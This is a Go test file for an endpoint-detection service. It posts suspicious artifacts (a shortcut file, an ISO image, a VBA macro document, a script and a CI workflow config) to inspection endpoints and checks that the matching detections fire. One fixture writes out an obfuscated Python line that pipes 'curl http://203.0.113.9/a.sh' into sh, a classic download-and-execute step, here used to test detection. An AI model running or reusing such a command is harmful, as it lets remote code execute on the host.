// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"net/http"
	"testing"
)

// TestInspectEndToEndArtifactAnalyzers drives the shortcut, disk-image, macro,
// script and CI/config analyzers through the real HTTP endpoints.
func TestInspectEndToEndArtifactAnalyzers(t *testing.T) {
	mux := http.NewServeMux()
	RegisterInspect(mux, "tok")

	r := inspectPost(t, mux, "/v1/inspect/file?name=invoice.lnk", "application/octet-stream", fixtureLNKEvil())
	if !hasAnalyzer(r, "file-lnk") || len(r.Errors) != 0 || r.Level == "clean" {
		t.Fatalf("lnk: level=%s errors=%v analyzers=%v", r.Level, r.Errors, r.Analyzers)
	}
	r = inspectPost(t, mux, "/v1/inspect/file?name=x.iso", "application/octet-stream",
		buildISO([]string{"autorun.inf", "a.exe"}, []string{"b.lnk"}, false))
	if !hasAnalyzer(r, "file-diskimage") || r.Format != "ISO9660" || len(r.Errors) != 0 {
		t.Fatalf("iso: format=%q errors=%v", r.Format, r.Errors)
	}
	fileMustHave(t, &r, "iso-autorun", "iso-lnk-plus-payload")
	r = inspectPost(t, mux, "/v1/inspect/file?name=m.doc", "application/octet-stream", buildOLEWithVBA(vbaMalicious))
	if !hasAnalyzer(r, "file-vba") || len(r.Errors) != 0 {
		t.Fatalf("vba: errors=%v analyzers=%v", r.Errors, r.Analyzers)
	}
	fileMustHave(t, &r, "vba-autoexec", "vba-download-exec")

	script := "exec(base64.b64decode('" + b64s(`os.system("curl http://203.0.113.9/a.sh | sh")`) + "'))\n"
	r = inspectPost(t, mux, "/v1/inspect/script", "text/plain", []byte(script))
	if !hasAnalyzer(r, "script-static") || len(r.Errors) != 0 {
		t.Fatalf("script: errors=%v analyzers=%v", r.Errors, r.Analyzers)
	}
	fileMustHave(t, &r, "scr-eval-decoded", "scr-download-exec")

	r = inspectPost(t, mux, "/v1/inspect/config?name=.github/workflows/ci.yml", "text/plain", []byte(ghPwn))
	if !hasAnalyzer(r, "config-extra") || r.Level != "not_scored" || r.Score != 0 {
		t.Fatalf("config: level=%s score=%d analyzers=%v", r.Level, r.Score, r.Analyzers)
	}
	fileMustHave(t, &r, "cfgx-gha-pwn-request")
}
